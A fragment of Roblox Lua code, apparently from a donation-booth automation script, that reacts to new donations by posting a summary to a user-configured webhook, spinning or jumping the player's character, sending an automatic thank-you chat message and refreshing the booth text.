            newRaisedFormat.Changed:Connect(function()
                local raised = newRaisedFormat.Value - RaisedC
                if raised > 0 and _G.settings.webhookToggle and req and _G.settings.webhookBox ~= "" then
                    pcall(function()
                        req({ Url = _G.settings.webhookBox:gsub(" ", ""), Method = "POST", Headers = {["Content-Type"] = "application/json"},
                            Body = HttpService:JSONEncode({embeds = {{title = player.Name .. " just got donated!", description = string.format("%d R$ AT %d R$ Total %d R$", raised, math.floor(raised * 0.6), tonumber(newRaisedFormat.Value)), color = 0x2ECC71}}})
                        })
                    end)
                end
                if _G.settings.spinSet and player.Character and player.Character.Humanoid.RootPart:FindFirstChild('Spin') then
                    local spin = player.Character.Humanoid.RootPart.Spin
                    spin.AngularVelocity = Vector3.new(0, spin.AngularVelocity.Y + (raised/3)*_G.settings.spinSpeedMultiplier, 0)
                end
                if _G.settings.donationJump and player.Character then
                    task.spawn(function() for i=1, raised * tonumber(_G.settings.jumpsPerRobux) do player.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping) task.wait(0.5) end end)
                end
                if _G.settings.autoThanks then
                    task.spawn(function() task.wait(tonumber(_G.settings.thanksDelay) or 3); local tMsgs = splitString(_G.settings.thanksMessage); if #tMsgs > 0 then chat(tMsgs[math.random(#tMsgs)]) end end)
                end
                RaisedC = newRaisedFormat.Value
                task.wait(tonumber(_G.settings.textUpdateDelay) or 30)
                updateBoothText()
            end)
            updateBoothText()
        end
    end
